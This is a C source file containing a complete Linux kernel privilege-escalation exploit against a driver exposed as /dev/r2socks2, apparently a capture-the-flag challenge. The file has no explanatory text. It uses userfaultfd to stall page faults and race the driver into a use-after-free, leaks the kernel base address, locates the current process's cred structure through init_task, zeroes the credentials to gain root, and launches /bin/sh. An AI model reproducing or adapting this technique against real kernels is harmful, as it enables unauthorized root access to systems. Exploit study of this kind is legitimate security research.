#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include<sys/socket.h>
#include<sys/xattr.h>
#include <sys/prctl.h>

#define DEVICE_FILE "/dev/r2socks2"
#define PAGESIZE 0x1000ul

#define ALLOC 0xc0087301ul
#define LINK 0xc0407302ul
#define UNLINK 0xc0407303ul
#define FILL 0xc0107304ul
#define LEAK 0xc0107305ul
#define EDIT 0xc0087306ul

#define LEAK_OFFSET 0x68d20ul
#define COMM 0x570ul
#define CRED 0x568ul
#define PREV 0x2d0ul
#define NEXT 0x2c8ul

unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long init_task=0x100f740;

int fd1,fd2,fd3,fd4;
int count=0,ufd,ccount=0;
int ffds[0x10];
char buf[0x40];
void *fakestack=NULL;
void *pages=NULL;
unsigned long name=0x4141414141414141;

struct req_s {
	unsigned long size;
	unsigned long addr;
};
struct info_s {
	unsigned long size;
	unsigned long addr;
	unsigned long field0x10;
	unsigned long field0x18;
};
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}
int userfaultfd(int flags){
	return syscall(SYS_userfaultfd, flags);
}
int prepareUFD(unsigned long pages,unsigned long memsize){
	int fd=0;
	if((fd=userfaultfd(O_NONBLOCK))==-1){
		perror("[-] userfaultfd failed!");
		exit(-1);
	}
	struct uffdio_api api={.api=UFFD_API};
	if (ioctl(fd,UFFDIO_API,&api)){
		perror("[-] ioctl(fd, UFFDIO_API, ...) failed!");
		exit(-1);
	}
	if (api.api!=UFFD_API){
		perror("[-] unexepcted UFFD api version!");
		exit(-1);
	}
	struct uffdio_register reg={
		.mode=UFFDIO_REGISTER_MODE_MISSING,
		.range={
			.start=pages,
			.len=memsize
		}
	};
	if (ioctl(fd,UFFDIO_REGISTER,&reg)){
		perror("[-] ioctl(fd, UFFDIO_REGISTER, ...) failed!");
		exit(-1);
	}
	if (reg.ioctls!=UFFD_API_RANGE_IOCTLS){
		perror("[-] unexpected UFFD ioctls!");
		exit(-1);
	}
	return fd;
}
void alloc(int *fd,unsigned long size){
	ioctl(*fd,ALLOC,size);
}		
void links(int *fd,char *buf){
	ioctl(*fd,LINK,buf);
}
void unlinks(int *fd,char *buf){
	ioctl(*fd,UNLINK,buf);
}
void fill(int *fd,unsigned long size,unsigned long addr){
	struct req_s req={.size=size,.addr=addr};
	ioctl(*fd,FILL,(char *)&req);
}
void edit(int *fd,unsigned long size){
	ioctl(*fd,EDIT,size);
}
void leaks(int *fd,unsigned long size,unsigned long addr){
	struct req_s req={.size=size,.addr=addr};
	ioctl(*fd,LEAK,(char *)&req);
}
void setup(){
	fd1=open(DEVICE_FILE,O_RDWR);
	fd2=open(DEVICE_FILE,O_RDWR);
	alloc(&fd1,0x20);
	alloc(&fd2,0x20);
	links(&fd1,buf);
	unlinks(&fd2,buf);
}
void reset(){
	close(fd1);
	close(fd2);
}
int clonefunc(void *arg){
	//puts("[*] Attempt to trigger page-fault via child process!");
	ccount++;
	if(ccount==1){
		fill(&fd1,0x20,(unsigned long)arg);
	}
	else if(ccount==2){
		leaks(&fd2,0x80,(unsigned long)arg);
	}
	//else if(ccount==3||ccount==4){
	else{
		fill(&fd1,0x20,(unsigned long)arg);
	}
	//puts("[+] Page-fault handled! Returning to parent!");
}
void handle_pagefault(void *pages,char *attack){
	struct pollfd evt={.fd=ufd,.events=POLLIN};
	while(poll(&evt,1,10)>0){
		if(evt.revents&POLLERR){
			perror("poll");
			exit(-1);
		} 
		else if(evt.revents&POLLHUP){
			perror("pollhup");
			exit(-1);
		}
		struct uffd_msg fault_msg={0};
		if (read(ufd,&fault_msg,sizeof(fault_msg))!=sizeof(fault_msg)){
			perror("read");
			exit(-1);
		}
		char *place=(char *)fault_msg.arg.pagefault.address;
		if (fault_msg.event!=UFFD_EVENT_PAGEFAULT || place!=pages) {
			perror("[-] unexpected pagefault?");
			exit(-1);
		}
		if (place==pages){
			count++;
			//printf("[+] got page fault #%d at address %p, nice!\n",count,place);
			//puts("[*] Parent process attempting to handle page-fault!");
			if(count==1){
				edit(&fd2,0x80);
				ffds[0]=open("/proc/self/stat",O_RDONLY);
			}
			else if(count==2){
				edit(&fd2,0x90);
				socket(22,AF_INET,0);
			}
			//else if(count==3||count==4){
			else{
				edit(&fd2,0x80);
				alloc(&fd3,0x50);
			}
			//puts("[+] deadlock vuln done! now releasing ufd to continue.....");
			struct uffdio_copy copy ={
				.dst=(long)place,
				.src=(long)attack,
				.len=PAGESIZE
			};
			if (ioctl(ufd,UFFDIO_COPY,&copy)<0){
				perror("ioctl(UFFDIO_COPY)");
				exit(-1);
			}
			break;
		}
	}	
	wait(NULL);
}
unsigned long read8(int n,unsigned long addr){
	struct info_s info={.size=0x100,.addr=addr,.field0x10=0,.field0x18=8};
	unsigned long leaks_buf;	
	fd3=open(DEVICE_FILE,O_RDWR);
	fd4=open(DEVICE_FILE,O_RDWR);
	setup();
	clone(clonefunc,fakestack+0x10000,CLONE_VM|CLONE_FILES|SIGCHLD,(void *)((unsigned long)pages+n*0x1000));
	handle_pagefault((void *)((unsigned long)pages+n*0x1000),(char *)&info);
	alloc(&fd4,0x20);
	links(&fd3,buf);
	unlinks(&fd4,buf);
	leaks(&fd3,0x8,(unsigned long)&leaks_buf);
	reset();
	return leaks_buf;
}
void writen(int n,unsigned long addr,unsigned long size){
	struct info_s info={.size=size,.addr=addr,.field0x10=0,.field0x18=0};
	char payload[0x20];
	for(int i=0;i<0x20;i++){
		payload[i]='\x00';
	}
	fd3=open(DEVICE_FILE,O_RDWR);
	fd4=open(DEVICE_FILE,O_RDWR);
	setup();
	clone(clonefunc,fakestack+0x10000,CLONE_VM|CLONE_FILES|SIGCHLD,(void *)((unsigned long)pages+n*0x1000));
	handle_pagefault((void *)((unsigned long)pages+n*0x1000),(char *)&info);
	alloc(&fd4,0x20);
	links(&fd3,buf);
	unlinks(&fd4,buf);
	fill(&fd4,0x20,(unsigned long)payload);
	reset();
}
void exploit(){
	for(int i=0;i<0x40;i++){
		buf[i]='A';
	}
	pages=mmap((void *)0xdead000,0x7000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
	if (pages==MAP_FAILED){
		perror("mmap");
		exit(-1);
	}
	ufd=prepareUFD((unsigned long)pages,0x7000);
	fakestack=malloc(0x20000);
	if (!fakestack){
		perror("malloc");
		exit(-1);
	}
	setup();
	clone(clonefunc,fakestack+0x10000,CLONE_VM|CLONE_FILES|SIGCHLD,pages);
	handle_pagefault(pages,buf);
	clone(clonefunc,fakestack+0x10000,CLONE_VM|CLONE_FILES|SIGCHLD,(void *)((unsigned long)pages+0x1000));
	handle_pagefault((void *)((unsigned long)pages+0x1000),buf);
	kernel_leak=*(unsigned long *)(0xdeae018);
	printf("[+ ]kernel_leak = %p\n",(void *)kernel_leak);
	kernel_base=kernel_leak-LEAK_OFFSET;
	printf("[+] kernel_base = %p\n",(void *)kernel_base);
	init_task+=kernel_base;
	printf("[+] kernel_init_task = %p\n",(void *)init_task);
	reset();
	unsigned long task;
	unsigned long ptask=init_task;
	unsigned long target_task=read8(2,init_task+PREV)-NEXT;
	printf("[+] Current task_struct = %p\n",(void *)target_task);
	unsigned long target_cred=read8(3,target_task+CRED);	
	printf("[+] Current cred_struct = %p\n",(void *)target_cred);
	writen(4,target_cred+4,0x20);
}
int main(){
	exploit();
	getshell();
}
